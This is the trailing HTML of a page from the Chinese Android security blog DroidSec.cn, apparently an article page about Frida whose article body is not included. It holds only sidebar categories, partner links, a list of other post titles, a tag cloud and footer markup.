</article>
<p>&nbsp;</p>
	</div><div class="col-lg-3" id="side"><aside class="uazoh7-widget"><h3 style="margin-top: 0px;">文章分类</h3>		<div class="uazoh7-category-widget"><div class="uazoh7-widget-inner"><ul>
<li><p><a href="http://www.droidsec.cn/category/app%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98/" title="APP漏洞挖掘"><i class="fa fa-folder-open"></i>APP漏洞挖掘</a> <a href="http://www.droidsec.cn/category/app%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98/"><i class="fa fa-rss"></i></a> <span>25</span></p><small></small></li><li><p><a href="http://www.droidsec.cn/category/androidsecuritybook/" title="安卓安全书籍"><i class="fa fa-folder-open"></i>安卓安全书籍</a> <a href="http://www.droidsec.cn/category/androidsecuritybook/"><i class="fa fa-rss"></i></a> <span class="">8</span></p><small></small></li><li><p><a href="http://www.droidsec.cn/category/%e5%ae%89%e5%8d%93%e5%ae%89%e5%85%a8%e5%b7%a5%e5%85%b7/" title="安卓安全工具"><i class="fa fa-folder-open"></i>安卓安全工具</a> <a href="http://www.droidsec.cn/category/%e5%ae%89%e5%8d%93%e5%ae%89%e5%85%a8%e5%b7%a5%e5%85%b7/"><i class="fa fa-rss"></i></a> <span class="">11</span></p><small></small></li><li><p><a href="http://www.droidsec.cn/category/%e5%ae%89%e5%8d%93%e6%bc%8f%e6%b4%9e%e6%94%bb%e9%98%b2/" title="安卓漏洞攻防"><i class="fa fa-folder-open"></i>安卓漏洞攻防</a> <a href="http://www.droidsec.cn/category/%e5%ae%89%e5%8d%93%e6%bc%8f%e6%b4%9e%e6%94%bb%e9%98%b2/"><i class="fa fa-rss"></i></a> <span>16</span></p><small></small></li><li><p><a href="http://www.droidsec.cn/category/%e5%ae%89%e5%8d%93%e9%80%86%e5%90%91%e5%88%86%e6%9e%90/" title="安卓逆向分析"><i class="fa fa-folder-open"></i>安卓逆向分析</a> <a href="http://www.droidsec.cn/category/%e5%ae%89%e5%8d%93%e9%80%86%e5%90%91%e5%88%86%e6%9e%90/"><i class="fa fa-rss"></i></a> <span class="">9</span></p><small></small></li><li><p><a href="http://www.droidsec.cn/category/%e7%a7%bb%e5%8a%a8%e5%ae%89%e5%85%a8%e8%b5%84%e8%ae%af/" title="移动安全资讯"><i class="fa fa-folder-open"></i>移动安全资讯</a> <a href="http://www.droidsec.cn/category/%e7%a7%bb%e5%8a%a8%e5%ae%89%e5%85%a8%e8%b5%84%e8%ae%af/"><i class="fa fa-rss"></i></a> <span>9</span></p><small></small></li>		</ul></div></div>
</aside><aside class="uazoh7-widget"><h3>友情链接</h3>
	<ul class="xoxo blogroll">
<li><a href="http://security.tencent.com/" target="_blank">腾讯TSRC</a></li>
<li><a href="http://www.ijiandao.com/" target="_blank">爱尖刀</a></li>
<li><a href="http://xteam.baidu.com/" target="_blank">Baidu x-team</a></li>
<li><a href="http://blogs.360.cn/360mobile/" target="_blank">360移动安全</a></li>
<li><a href="http://navisec.it/" target="_blank">navisec安全导航</a></li>
<li><a href="http://www.nxadmin.com/">Nxadmin</a></li>
<li><a href="http://www.secpulse.com/" target="_blank">安全脉博</a></li>
<li><a href="http://www.monstersb.net/" target="_blank">Monster</a></li>
<li><a href="http://jaq.alibaba.com/blog.htm" target="_blank">阿里聚安全</a></li>
<li><a href="http://www.freebuf.com/" target="_blank">FreeBuf</a></li>
<li><a href="http://www.wooyun.org/" target="_blank">乌云漏洞平台</a></li>
<li><a href="http://wiki.secmobi.com/home" target="_blank">SecMobi Wiki</a></li>
<li><a href="http://securityintelligence.com/" target="_blank">SecurityIntelligence</a></li>
<li><a href="http://androidxref.com/" target="_blank">AndroidXRef</a></li>
<li><a href="http://www.androiddevtools.cn/" target="_blank">AndroidDevTools</a></li>

	</ul>
</aside>
</div></div></div></section>
<div id="comments" style="display:none"><a name="respond"></a></div>
<div id="denglu_tuijian"></div><div id="denglu_comment"><iframe name="easyXDM_default8326_provider" id="easyXDM_default8326_provider" frameborder="0" src="Frida-跨平台注入工具基础篇 _ DroidSec.cn_files/commentMiddle.html" style="width: 100%; height: 232px;"></iframe></div>

</div><!--uazoh7-content-->
<footer class="uazoh7-footer">
      <div class="container">
        <div class="row">
		<div class="col-lg-2 col-md-2">
            <div class="uazoh7-widget uazoh7-links-widget">
              <h3>links</h3>
              <div class="uazoh7-widget-inner">
                <ul id="footer_top_nav" class="mobile-menu"><li><a href="http://www.droidsec.cn/">首页</a><span class="border"></span></li>
<li><a href="http://www.droidsec.cn/android-security-basic/">Android安全基础</a><span class="border"></span></li>
<li><a href="http://www.droidsec.cn/app%e5%ae%89%e5%85%a8%e6%b5%8b%e8%af%95%e5%85%a5%e9%97%a8/">APP安全测试入门</a><span class="border"></span></li>
<li><a href="http://www.droidsec.cn/%e9%87%91%e5%88%9a%e5%ae%a1%e8%ae%a1%e7%b3%bb%e7%bb%9f/">金刚审计系统</a><span class="border"></span></li>
<li><a href="http://www.droidsec.cn/%e5%85%b3%e4%ba%8e%e6%9c%ac%e7%ab%99/">关于DroidSec</a><span class="border"></span></li>
<li><a href="http://weibo.com/androidsec">关注本站微博</a><span class="border"></span></li>
</ul>              </div>
            </div>
          </div>

          <div class="col-lg-4 col-md-4">
            <div class="uazoh7-widget uazoh7-links-widget uazoh7-about-widget">
              <h3>随机 <strong>文章</strong></h3>
              <div class="uazoh7-widget-inner">
   <ul>
<li><a href="http://www.droidsec.cn/localbroadcastmanager-%e7%9a%84%e5%ae%9e%e7%8e%b0%e5%8e%9f%e7%90%86%e5%88%86%e6%9e%90/" rel="bookmark" title="LocalBroadcastManager 的实现原理分析">LocalBroadcastManager 的实现原理分析</a><span class="border"></span></li>
<li><a href="http://www.droidsec.cn/%e8%af%a6%e8%a7%a3android-app-allowbackup%e9%85%8d%e7%bd%ae%e5%b8%a6%e6%9d%a5%e7%9a%84%e9%a3%8e%e9%99%a9/" rel="bookmark" title="两分钟窃取身边女神微博帐号？详解Android App AllowBackup配置带来的风险">两分钟窃取身边女神微博帐号？详解Android App AllowBackup配置带来的风险</a><span class="border"></span></li>
<li><a href="http://www.droidsec.cn/android-9patch-%e5%9b%be%e7%89%87%e8%a7%a3%e6%9e%90%e5%a0%86%e6%ba%a2%e5%87%ba%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%ef%bc%88cve-2015-1532%ef%bc%89/" rel="bookmark" title="Android 9patch 图片解析堆溢出漏洞分析（CVE-2015-1532）">Android 9patch 图片解析堆溢出漏洞分析（CVE-2015-1532）</a><span class="border"></span></li>
<li><a href="http://www.droidsec.cn/2015%e9%98%bf%e9%87%8c%e7%a7%bb%e5%8a%a8%e5%ae%89%e5%85%a8%e6%8c%91%e6%88%98%e8%b5%9bwriteup/" rel="bookmark" title="2015移动安全挑战赛（阿里&amp;看雪主办）全程回顾">2015移动安全挑战赛（阿里&amp;看雪主办）全程回顾</a><span class="border"></span></li>
<li><a href="http://www.droidsec.cn/cve-2014-7911%e5%ae%89%e5%8d%93%e6%8f%90%e6%9d%83%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90/" rel="bookmark" title="cve-2014-7911安卓提权漏洞分析">cve-2014-7911安卓提权漏洞分析</a><span class="border"></span></li>
<li><a href="http://www.droidsec.cn/android-https%e4%b8%ad%e9%97%b4%e4%ba%ba%e5%8a%ab%e6%8c%81%e6%bc%8f%e6%b4%9e%e6%b5%85%e6%9e%90/" rel="bookmark" title="Android HTTPS中间人劫持漏洞浅析">Android HTTPS中间人劫持漏洞浅析</a><span class="border"></span></li>
<li><a href="http://www.droidsec.cn/android%e6%9c%ac%e5%9c%b0%e6%95%b0%e6%8d%ae%e5%ad%98%e5%82%a8%ef%bc%9ashared-preferences%e5%ae%89%e5%85%a8%e9%a3%8e%e9%99%a9%e6%b5%85%e6%9e%90/" rel="bookmark" title="Android本地数据存储：Shared Preferences安全风险浅析">Android本地数据存储：Shared Preferences安全风险浅析</a><span class="border"></span></li>
<li><a href="http://www.droidsec.cn/google%e5%ae%98%e6%96%b9%e5%87%ba%e5%93%81%e7%9a%84android-app%e5%8f%8d%e7%bc%96%e7%bb%8e%e5%b7%a5%e5%85%b7-enjarify/" rel="bookmark" title="Google官方出品的Android App反编绎工具-enjarify">Google官方出品的Android App反编绎工具-enjarify</a><span class="border"></span></li>
<li><a href="http://www.droidsec.cn/%e5%ae%89%e5%8d%93%e7%89%88dropbox-sdk%e5%ad%98%e5%9c%a8%e8%bf%9c%e7%a8%8b%e5%88%a9%e7%94%a8%e6%bc%8f%e6%b4%9e/" rel="bookmark" title="安卓版Dropbox SDK被爆存在远程利用漏洞，目前已紧急修复">安卓版Dropbox SDK被爆存在远程利用漏洞，目前已紧急修复</a></li>
</ul>
            </div>
          </div></div>

          <div class="col-lg-3 col-md-3">
            <div class="uazoh7-widget uazoh7-tags-widget">
              <h3>文章 <strong>Tags</strong></h3>
              <div class="uazoh7-widget-inner">
                <a href="http://www.droidsec.cn/tag/pin/" class="tag-link-47" title="1个话题" style="font-size: 13pt;">PIN</a>
<a href="http://www.droidsec.cn/tag/tsrc/" class="tag-link-48" title="1个话题" style="font-size: 13pt;">TSRC</a>
<a href="http://www.droidsec.cn/tag/ui/" class="tag-link-42" title="1个话题" style="font-size: 13pt;">UI</a>
<a href="http://www.droidsec.cn/tag/activity/" class="tag-link-36" title="1个话题" style="font-size: 13pt;">Activity</a>
<a href="http://www.droidsec.cn/tag/mobile-forensics/" class="tag-link-32" title="1个话题" style="font-size: 13pt;">Mobile Forensics</a>
<a href="http://www.droidsec.cn/tag/santoku-linux/" class="tag-link-33" title="1个话题" style="font-size: 13pt;">Santoku Linux</a>
<a href="http://www.droidsec.cn/tag/url/" class="tag-link-49" title="1个话题" style="font-size: 13pt;">URL</a>
<a href="http://www.droidsec.cn/tag/sd/" class="tag-link-50" title="1个话题" style="font-size: 13pt;">SD</a>
<a href="http://www.droidsec.cn/tag/debug/" class="tag-link-62" title="1个话题" style="font-size: 13pt;">DEBUG</a>
<a href="http://www.droidsec.cn/tag/google-android/" class="tag-link-71" title="1个话题" style="font-size: 13pt;">Google Android</a>
<a href="http://www.droidsec.cn/tag/verbose/" class="tag-link-61" title="1个话题" style="font-size: 13pt;">VERBOSE</a>
<a href="http://www.droidsec.cn/tag/android-override/" class="tag-link-57" title="1个话题" style="font-size: 13pt;">Android Override</a>
<a href="http://www.droidsec.cn/tag/http/" class="tag-link-51" title="1个话题" style="font-size: 13pt;">HTTP</a>
<a href="http://www.droidsec.cn/tag/mitm/" class="tag-link-52" title="1个话题" style="font-size: 13pt;">MITM</a>
<a href="http://www.droidsec.cn/tag/adb/" class="tag-link-24" title="1个话题" style="font-size: 13pt;">ADB</a>
<a href="http://www.droidsec.cn/tag/root/" class="tag-link-22" title="1个话题" style="font-size: 13pt;">ROOT</a>
<a href="http://www.droidsec.cn/tag/android-shared-preferences/" class="tag-link-18" title="1个话题" style="font-size: 13pt;">Android Shared Preferences</a>
<a href="http://www.droidsec.cn/tag/android-internal-storage/" class="tag-link-19" title="1个话题" style="font-size: 13pt;">Android Internal Storage</a>
<a href="http://www.droidsec.cn/tag/android-backup/" class="tag-link-21" title="1个话题" style="font-size: 13pt;">Android Backup</a>
<a href="http://www.droidsec.cn/tag/gui/" class="tag-link-35" title="2个话题" style="font-size: 13pt;">GUI</a>
<a href="http://www.droidsec.cn/tag/android-system/" class="tag-link-12" title="2个话题" style="font-size: 13pt;">Android System</a>
<a href="http://www.droidsec.cn/tag/uri/" class="tag-link-46" title="2个话题" style="font-size: 13pt;">URI</a>
<a href="http://www.droidsec.cn/tag/uc/" class="tag-link-53" title="2个话题" style="font-size: 13pt;">UC</a>
<a href="http://www.droidsec.cn/tag/gid/" class="tag-link-89" title="2个话题" style="font-size: 13pt;">GID</a>
<a href="http://www.droidsec.cn/tag/uxss/" class="tag-link-74" title="2个话题" style="font-size: 13pt;">UXSS</a>
<a href="http://www.droidsec.cn/tag/apk/" class="tag-link-15" title="3个话题" style="font-size: 13pt;">APK</a>
<a href="http://www.droidsec.cn/tag/jeb/" class="tag-link-44" title="3个话题" style="font-size: 13pt;">JEB</a>
<a href="http://www.droidsec.cn/tag/drozer/" class="tag-link-76" title="3个话题" style="font-size: 13pt;">Drozer</a>
<a href="http://www.droidsec.cn/tag/api/" class="tag-link-59" title="3个话题" style="font-size: 13pt;">API</a>
<a href="http://www.droidsec.cn/tag/poc/" class="tag-link-16" title="4个话题" style="font-size: 13pt;">POC</a>              </div>
            </div>
          </div>

          <div class="col-lg-3 col-md-3">
            <div class="uazoh7-widget uazoh7-about-widget">
              <h3>关注 | 联系</h3>
              <div class="uazoh7-widget-inner">                  <img src="Frida-跨平台注入工具基础篇 _ DroidSec.cn_files/3d563857728b88c4f666a9d9adb4c2ed_qrcode.png" alt="DroidSec.cn qr-code">				  <p class="contacts" style="border-top-width: 1px; margin-top: 30px;"><i class="fa fa-envelope"></i> DroidSec#QQ.com</p>              </div>
            </div>
          </div>

          <div class="col-lg-12">
            <div class="uazoh7-widget uazoh7-copyright-widget">
              <div class="uazoh7-widget-inner">
                <p>© Copyright 2015 by DroidSec.cn. All Rights Reserved.</p>
                <p><a href="http://weibo.com/androidsec">更多安卓安全资讯请关注本站微博</a> </p>
              </div>
            </div>
          </div>        </div>
      </div>
</footer>








<div id="cboxOverlay" style="display: none;"></div><div id="colorbox" class="" role="dialog" tabindex="-1" style="display: none;"><div id="cboxWrapper"><div><div id="cboxTopLeft" style="float: left;"></div><div id="cboxTopCenter" style="float: left;"></div><div id="cboxTopRight" style="float: left;"></div></div><div style="clear: left;"><div id="cboxMiddleLeft" style="float: left;"></div><div id="cboxContent" style="float: left;"><div id="cboxTitle" style="float: left;"></div><div id="cboxCurrent" style="float: left;"></div><button type="button" id="cboxPrevious"></button><button type="button" id="cboxNext"></button><button id="cboxSlideshow"></button><div id="cboxLoadingOverlay" style="float: left;"></div><div id="cboxLoadingGraphic" style="float: left;"></div><button type="button" id="cboxClose"></button></div><div id="cboxMiddleRight" style="float: left;"></div></div><div style="clear: left;"><div id="cboxBottomLeft" style="float: left;"></div><div id="cboxBottomCenter" style="float: left;"></div><div id="cboxBottomRight" style="float: left;"></div></div></div><div style="position: absolute; width: 9999px; visibility: hidden; display: none;"></div></div>

 </body></html>